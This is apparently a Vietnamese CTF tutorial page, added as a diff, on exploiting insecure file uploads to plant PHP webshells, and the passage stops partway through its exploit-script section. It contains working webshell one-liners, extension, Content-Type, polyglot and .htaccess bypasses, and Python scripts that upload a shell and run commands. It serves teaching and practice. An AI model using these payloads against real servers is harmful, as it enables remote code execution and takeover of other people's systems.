@@ -1,0 +1,568 @@
+<title>File Upload khai thác — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · File &amp; Path</div>
+    <h1>File Upload khai thác (Webshell)</h1>
+    <p class="sub">Khi trang web cho phép bạn tải file lên (avatar, tài liệu, báo cáo...) và không kiểm tra kỹ
+    file đó thực sự là gì — bạn có thể tải lên một file code (thường là PHP), khiến server <strong>chạy code đó</strong>
+    mỗi khi ai mở file lên, biến nó thành "cửa hậu" (webshell) để gửi lệnh tùy ý tới server.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload &amp; bypass</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>File Upload khai thác là gì, để làm gì?</h2>
+  <p class="lead">Website nào cũng có lúc cần nhận file từ người dùng: ảnh đại diện, CV, báo cáo. Server cần phân
+  biệt "file này an toàn (ảnh, PDF)" với "file này nguy hiểm (code chạy được)". Nếu việc kiểm tra đó làm sai —
+  chỉ nhìn đuôi file, chỉ nhìn Content-Type do <em>chính bạn</em> khai báo, hoặc không kiểm tra gì cả — bạn tải
+  lên một file <code>.php</code> chứa code, rồi chỉ cần <strong>mở đúng URL của file đó</strong> là server tự
+  chạy code trong đó, y như bạn đang gõ lệnh trực tiếp trên server.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  File bạn tải lên **không nguy hiểm vì nó là file** — nó nguy hiểm vì sau đó <strong>server chạy nó như code</strong>.
+  Vậy luôn có 2 việc phải làm: (1) đưa được file độc lên server, (2) tìm cách khiến server <em>thực thi</em> file
+  đó (thường bằng cách mở đúng URL của file vừa upload).</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ FILE UPLOAD → WEBSHELL</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có form upload avatar/CV/ảnh/báo cáo. Upload thử file <code>.php</code> chứa
+        <code>&lt;?php echo "test123"; ?&gt;</code> → nếu mở lại URL file đó thấy chữ <code>test123</code> in ra
+        (không phải mã nguồn PHP nguyên văn) ⟹ server đã CHẠY file, không chỉ lưu.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Biết (hoặc đoán được) <strong>URL nơi file upload được lưu</strong> sau khi tải lên thành công (xem Response,
+        thường trả về đường dẫn).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: upload file <code>.php</code> thường trước (xem có bị chặn ngay không) → nếu chặn, thử đổi
+        đuôi/Content-Type/magic byte (mục 06) → mỗi lần thử, Send và kiểm tra cả Response upload LẪN việc mở lại
+        file đó có chạy không.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (webshell PHP tối giản)</span>
+<pre><code><span class="c">&lt;!-- shell.php — upload file này --&gt;</span>
+&lt;?php system($_GET['c']); ?&gt;
+
+<span class="c"># Sau khi upload thành công, lấy flag bằng:</span>
+http://TARGET/uploads/shell.php?c=cat+flag.txt</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+
+files = {<span class="s">"file"</span>: (<span class="s">"shell.php"</span>, <span class="s">b'&lt;?php system($_GET["c"]); ?&gt;'</span>, <span class="s">"image/jpeg"</span>)}
+requests.post(<span class="s">"http://TARGET/upload"</span>, files=files)
+html = requests.get(<span class="s">"http://TARGET/uploads/shell.php"</span>, params={<span class="s">"c"</span>: <span class="s">"cat flag.txt"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Đuôi <code>.php</code> bị chặn → thử <code>.phtml</code>/<code>.php5</code>/<code>.pHp</code> (mục 06).
+        Upload OK nhưng không chạy được → kiểm tra xem server có phục vụ thư mục upload như static file (không
+        chạy PHP) không — thử path traversal trong tên file để ghi ra thư mục khác (mục 06). WAF rule nhanh: chặn
+        request upload có Content-Type/đuôi file nguy hiểm mà không nằm trong whitelist ảnh. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Multipart/form-data</b> — định dạng HTTP request đặc biệt dùng khi upload file (khác với
+  JSON/form thường). Request có nhiều "phần" (part), mỗi phần có thể là 1 trường text hoặc 1 file kèm tên, loại
+  (Content-Type do <strong>trình duyệt bạn tự khai báo</strong>, không phải server tự xác định).</div>
+  <div class="def"><b>Webshell</b> — một file code (thường PHP) khi được server chạy sẽ cho phép bạn gửi lệnh hệ
+  thống qua tham số URL, biến nó thành "cửa hậu" điều khiển server từ xa qua trình duyệt/script.</div>
+  <div class="def"><b>Magic byte (magic number)</b> — vài byte đầu tiên cố định của 1 định dạng file, dùng để
+  <em>nhận diện thật sự</em> loại file (không dựa vào đuôi tên file, vốn chỉ là chữ). Ví dụ ảnh JPEG luôn bắt đầu
+  bằng <code>FF D8 FF</code>, PNG bắt đầu bằng <code>89 50 4E 47</code>.</div>
+  <p>Code phía server hay kiểm tra kiểu (nhiều lỗ hổng do kiểm tra không đủ chặt):</p>
+  <pre><code><span class="c">// PHP — chỉ kiểm tra ĐUÔI tên file, không kiểm tra nội dung thật</span>
+$ext = pathinfo($_FILES[<span class="s">'file'</span>][<span class="s">'name'</span>], PATHINFO_EXTENSION);
+<span class="k">if</span> (in_array($ext, [<span class="s">'jpg'</span>,<span class="s">'png'</span>,<span class="s">'gif'</span>])) {
+    move_uploaded_file($_FILES[<span class="s">'file'</span>][<span class="s">'tmp_name'</span>], <span class="s">"uploads/"</span> . $_FILES[<span class="s">'file'</span>][<span class="s">'name'</span>]);
+}</code></pre>
+  <p>Vấn đề: chỉ nhìn <strong>tên file</strong> (chữ do bạn tự đặt, tự ý sửa được) chứ không nhìn <strong>nội
+  dung thật</strong> của file.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>3 bước kiểm tra, chỉ cần 1 bước sai là đủ</h2>
+  <p>Để upload an toàn, server đáng lẽ phải kiểm tra <strong>cả 3</strong> thứ sau, nhưng code thực tế hay chỉ
+  làm 1-2 trong số đó:</p>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Tên file / đuôi file</div><div class="d">Do người upload tự đặt — không đáng tin, chỉ nên dùng để <em>gợi ý</em>, không phải để <em>quyết định</em>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Content-Type trong request</div><div class="d">Cũng do trình duyệt/script của người upload tự khai báo — hoàn toàn giả mạo được (xem mục 06).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Nội dung thật của file (magic byte, parse thử)</div><div class="d">Thứ duy nhất đáng tin — nhưng nhiều app bỏ qua bước này vì "đã check đuôi rồi".</div></div></div>
+  </div>
+  <p>Và dù cả 3 bước trên có đúng hết, vẫn còn vế thứ hai của vấn đề: <strong>server có thực thi file trong thư
+  mục upload không?</strong> Nếu thư mục upload nằm trong vùng mà web server (Apache/Nginx) cấu hình "chạy PHP",
+  việc chặn đuôi <code>.php</code> là tuyến phòng thủ <em>duy nhất</em> — chặn thiếu 1 biến thể đuôi là đủ để
+  webshell chạy được.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Upload rồi mở lại — 2 bước tách biệt</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr5)}
+    </style>
+    <defs><marker id="arr5" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="195" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">BƯỚC 1 — Upload</text>
+    <text x="22" y="56" class="lbl-a">POST shell.php (code PHP)</text>
+
+    <path d="M205,48 H243" class="arrow"/>
+    <rect x="248" y="20" width="195" height="55" rx="10" class="box"/>
+    <text x="260" y="40" class="lbl-m">Server lưu file,</text>
+    <text x="260" y="56" class="lbl">KHÔNG chạy gì lúc này</text>
+
+    <path d="M345,80 V105" class="arrow"/>
+    <rect x="248" y="110" width="195" height="55" rx="10" class="box-a"/>
+    <text x="260" y="130" class="lbl-m">BƯỚC 2 — Mở URL</text>
+    <text x="260" y="146" class="lbl-a">GET /uploads/shell.php?c=id</text>
+
+    <path d="M248,135 H90" class="arrow"/>
+    <rect x="10" y="110" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="130" class="lbl-m">Server THẤY đuôi .php</text>
+    <text x="22" y="146" class="lbl-a">-&gt; CHẠY code -&gt; RCE!</text>
+  </svg>
+  </div>
+  <p>Điểm mấu chốt hay bị người mới bỏ qua: <strong>upload thành công không có nghĩa là đã khai thác xong</strong>.
+  Upload chỉ là bước 1 — đưa file lên server. Bước 2 (mở lại đúng URL file đó) mới là lúc server thực thi code.
+  Nhiều người mới dừng lại ngay sau khi thấy "Upload thành công!" mà quên luôn bước 2.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Form "Upload avatar/CV/ảnh/báo cáo"</td><td>Luôn đáng thử đầu tiên trong mọi challenge web không rõ loại lỗ hổng</td></tr>
+    <tr><td>Response sau khi upload trả về đường dẫn/URL file</td><td>Biết chính xác chỗ cần mở lại ở bước 2</td></tr>
+    <tr><td>Upload <code>.php</code> bị từ chối ngay (lỗi rõ ràng "invalid file type")</td><td>Có kiểm tra đuôi — thử các biến thể đuôi khác (mục 06)</td></tr>
+    <tr><td>Upload <code>.php</code> được chấp nhận nhưng mở lại hiện NGUYÊN VĂN code PHP (không chạy)</td><td>Server không cấu hình chạy PHP ở thư mục đó — cần tìm cách ghi ra thư mục khác (path traversal trong tên file) hoặc dùng đuôi mà server đó CÓ chạy (.phtml nếu Apache cấu hình riêng)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1 — bắt request upload</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp Proxy bật Intercept, upload 1 file ảnh thường qua form trên web.</li>
+    <li>Request bị giữ lại, dạng <strong>multipart/form-data</strong> — bạn sẽ thấy phần nội dung file nằm ngay
+    trong body request, kèm tên file và Content-Type.</li>
+    <li>Send to Repeater.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Bước 2 — sửa thành file độc, thử nhiều biến thể</span>
+  <ol style="margin:4px 0 0">
+    <li>Trong Repeater, sửa 3 chỗ độc lập để thử: <strong>tên file</strong> (đổi đuôi), <strong>Content-Type</strong>
+    khai báo trong phần đó, và <strong>nội dung file</strong> (thay bằng code PHP).</li>
+    <li>Send, đọc Response xem upload có bị từ chối không.</li>
+    <li>Nếu chấp nhận, mở tab mới (hoặc dùng request GET khác trong Repeater) gọi đúng URL file vừa upload kèm
+    tham số lệnh, đọc Response xem code có chạy không.</li>
+  </ol>
+  <strong>Mẹo:</strong> giữ nguyên phần ảnh JPEG thật ở đầu file (magic byte) rồi nối thêm code PHP ngay sau — vượt
+  được kiểm tra magic byte đơn giản (xem mục 06).</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD & BYPASS ĐẦY ĐỦ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Webshell PHP cơ bản</h3>
+  <pre><code><span class="c">&lt;!-- Chạy 1 lệnh qua tham số c --&gt;</span>
+&lt;?php system($_GET['c']); ?&gt;
+
+<span class="c">&lt;!-- Trả kết quả đẹp hơn (dùng khi output có ký tự đặc biệt) --&gt;</span>
+&lt;?php echo shell_exec($_GET['c']); ?&gt;
+
+<span class="c">&lt;!-- Siêu ngắn, dễ giấu trong file khác --&gt;</span>
+&lt;?=`$_GET[0]`?&gt;</code></pre>
+
+  <h3>B. Bypass theo đuôi file <span class="badge easy">thử trước</span></h3>
+  <table>
+    <tr><th>Bị chặn</th><th>Thử đuôi khác</th><th>Lý do ăn</th></tr>
+    <tr><td>Blacklist <code>.php</code></td><td><code>.phtml</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.phar</code></td><td>Apache (mod_php cấu hình cũ) thường chạy PHP cho nhiều đuôi này, blacklist hay quên liệt kê hết</td></tr>
+    <tr><td>Chỉ check đuôi cuối cùng</td><td><code>shell.php.jpg</code></td><td>Một số app dùng regex <code>.jpg$</code> lỏng lẻo, hoặc cấu hình Apache cũ (<code>AddHandler</code>) chạy PHP cho file có <code>.php</code> ở BẤT KỲ đâu trong tên, kể cả không phải đuôi cuối</td></tr>
+    <tr><td>Check hoa/thường</td><td><code>shell.pHp</code>, <code>shell.PHP</code></td><td>Blacklist chỉ so khớp chữ thường</td></tr>
+    <tr><td>Chặn khoảng trống/ký tự lạ</td><td><code>shell.php%00.jpg</code> (null byte — chỉ PHP rất cũ &lt;5.3.4), <code>shell.php.</code> (dấu chấm cuối, một số OS tự xóa khi lưu)</td><td>Chuỗi bị cắt/chuẩn hóa khác nhau giữa validate và lưu file</td></tr>
+  </table>
+
+  <h3>C. Bypass theo Content-Type / magic byte</h3>
+  <table>
+    <tr><th>Bị chặn</th><th>Cách né</th></tr>
+    <tr><td>Check Content-Type phải là <code>image/jpeg</code></td><td>Giữ nguyên nội dung file là code PHP, chỉ đổi header <code>Content-Type: image/jpeg</code> trong request (dễ giả mạo hoàn toàn, Content-Type không phản ánh nội dung thật)</td></tr>
+    <tr><td>Check magic byte đầu file phải đúng định dạng ảnh</td><td>Polyglot: ghép <code>GIF89a;</code> (magic byte GIF hợp lệ) ngay đầu file, nối code PHP ngay sau: <code>GIF89a;&lt;?php system($_GET['c']); ?&gt;</code> — qua được check magic byte đơn giản (chỉ đọc vài byte đầu) mà vẫn chạy được PHP (PHP không quan tâm có rác ở đầu file, miễn thấy thẻ <code>&lt;?php</code>)</td></tr>
+    <tr><td>App thật sự parse ảnh bằng thư viện ảnh (không chỉ check magic byte)</td><td>Giấu code PHP vào EXIF metadata của ảnh thật (kết hợp với LFI để include lại, xem bài LFI mục 06.C)</td></tr>
+  </table>
+
+  <h3>D. Khi upload OK nhưng không thực thi được</h3>
+  <table>
+    <tr><th>Tình huống</th><th>Hướng xử lý</th></tr>
+    <tr><td>Thư mục upload chỉ phục vụ static (không chạy PHP)</td><td>Tìm path traversal trong tên file (vd <code>../shell.php</code>) để ghi ra thư mục khác có chạy PHP — hiếm nhưng gặp ở challenge cũ</td></tr>
+    <tr><td>Server dùng <code>.htaccess</code> hạn chế</td><td>Nếu upload được cả file <code>.htaccess</code> tùy ý (không bị chặn tên file đặc biệt này), tải lên 1 file <code>.htaccess</code> tự khai báo <code>AddType application/x-httpd-php .jpg</code> — khiến MỌI file <code>.jpg</code> trong thư mục đó chạy như PHP, kể cả ảnh thường đã upload trước đó</td></tr>
+    <tr><td>Zip upload, server tự giải nén</td><td>Zip-slip: đặt tên file trong zip chứa <code>../../</code> để giải nén đè ra ngoài thư mục dự định</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: FFUF, SECLISTS WEBSHELL &amp; CYBERCHEF</div>
+  <h2>Không nhớ nổi payload bypass? Dùng công cụ</h2>
+
+  <h3>A. Webshell có sẵn offline — SecLists</h3>
+  <p>Tại <code>~/hoc/CTF/Tools/web/SecLists/Web-Shells/PHP/</code> có sẵn vài webshell PHP (một số bị obfuscate để né
+  antivirus/WAF theo pattern). Dùng khi webshell 1 dòng của bạn bị WAF chặn theo đúng chữ ký đó.</p>
+
+  <h3>B. ffuf — fuzz đuôi file &amp; wordlist bypass tự động</h3>
+  <pre><code><span class="c"># Fuzz xem đuôi nào được chấp nhận (cần viết script multipart tự custom vì ffuf không upload file sẵn,</span>
+<span class="c"># nhưng dùng được để fuzz TÊN đường dẫn sau khi đã biết file nằm ở đâu):</span>
+ffuf -u <span class="s">"http://TARGET/uploads/shell.FUZZ"</span> \
+     -w <span class="s">/tmp/exts.txt</span> \
+     -mc 200
+
+<span class="c"># exts.txt tự tạo nhanh:</span>
+echo -e <span class="s">"php\nphtml\nphp3\nphp4\nphp5\nphar\npHp"</span> > /tmp/exts.txt</code></pre>
+  <div class="note tip"><span class="tag">Mẹo thực chiến</span>Vì upload cần multipart/form-data (ffuf không hỗ
+  trợ xoay vòng nội dung file dễ dàng), cách nhanh hơn là <strong>tự viết vòng lặp Python thử từng đuôi</strong>
+  (xem script mục 08) — vẫn là "tự động hóa", chỉ không dùng ffuf cho riêng bước upload.</div>
+
+  <h3>C. CyberChef — tạo nhanh polyglot magic byte</h3>
+  <p>Mở <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code>. Kéo khối <strong>To Hex</strong> để xem đúng
+  magic byte của từng định dạng ảnh (JPEG <code>FF D8 FF</code>, PNG <code>89 50 4E 47</code>, GIF
+  <code>47 49 46 38 39 61</code>) khi cần tự ghép polyglot thủ công thay vì nhớ thuộc lòng.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET"</span>
+shell_code = <span class="s">b'&lt;?php system($_GET["c"]); ?&gt;'</span>
+
+<span class="c"># Bước 1: upload webshell, giả Content-Type là ảnh</span>
+files = {<span class="s">"file"</span>: (<span class="s">"shell.php"</span>, shell_code, <span class="s">"image/jpeg"</span>)}
+r = requests.post(<span class="s">f"{url}/upload"</span>, files=files)
+<span class="k">print</span>(<span class="s">"Upload response:"</span>, r.text)   <span class="c"># tìm đường dẫn file trong response này</span>
+
+<span class="c"># Bước 2: mở lại file, chạy lệnh</span>
+r = requests.get(<span class="s">f"{url}/uploads/shell.php"</span>, params={<span class="s">"c"</span>: <span class="s">"cat flag.txt"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dò nhiều đuôi tự động, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+EXTS = [<span class="s">"php"</span>, <span class="s">"phtml"</span>, <span class="s">"php5"</span>, <span class="s">"pHp"</span>]
+SHELL = <span class="s">b'&lt;?php system($_GET["c"]); ?&gt;'</span>
+
+<span class="k">def</span> <span class="d">exploit_upload</span>(host):
+    <span class="k">for</span> ext <span class="k">in</span> EXTS:
+        fname = <span class="s">f"shell.{ext}"</span>
+        r = requests.post(<span class="s">f"http://{host}/upload"</span>,
+                files={<span class="s">"file"</span>: (fname, SHELL, <span class="s">"image/jpeg"</span>)}, timeout=5)
+        <span class="k">if</span> r.status_code != 200:
+            <span class="k">continue</span>
+        check = requests.get(<span class="s">f"http://{host}/uploads/{fname}"</span>,
+                params={<span class="s">"c"</span>: <span class="s">"cat flag.txt"</span>}, timeout=5)
+        m = FLAG_RE.search(check.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
